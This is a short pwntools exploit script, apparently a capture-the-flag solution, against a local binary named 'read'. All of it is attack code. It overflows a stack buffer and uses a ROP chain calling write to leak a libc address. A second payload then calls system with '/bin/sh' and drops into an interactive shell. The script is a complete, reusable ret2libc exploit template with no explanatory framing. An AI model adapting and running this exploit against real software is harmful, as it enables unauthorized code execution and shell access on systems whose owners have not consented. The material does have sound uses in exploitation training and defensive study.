from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']
context.arch = 'amd64'

elf = ELF("./read")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

sh = process("./read")

rdi_ret = 0x4006b3
rsi_r15_ret = 0x4006b1

write_got = elf.got['write']
write_plt = 0x00000000004004b0
main = 0x40061A

sh.recvuntil("Input:\n")
payload = b'a'*0x88 + p64(rdi_ret) + p64(1)
payload += p64(rsi_r15_ret) + p64(write_got) + p64(0)
payload += p64(write_plt) + p64(main)
gdb.attach(sh)
sh.sendline(payload)

write = u64(sh.recv(6).ljust(8,b'\x00'))
print('write:'+hex(write))

libc_base = write - libc.symbols['write']
system = libc_base + libc.symbols['system']
str_bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

sh.recvuntil(b"Input:\n")
payload = b'a'*(0x80+8)+p64(rdi_ret)+p64(str_bin_sh)+p64(system)
sh.sendline(payload)


sh.interactive()

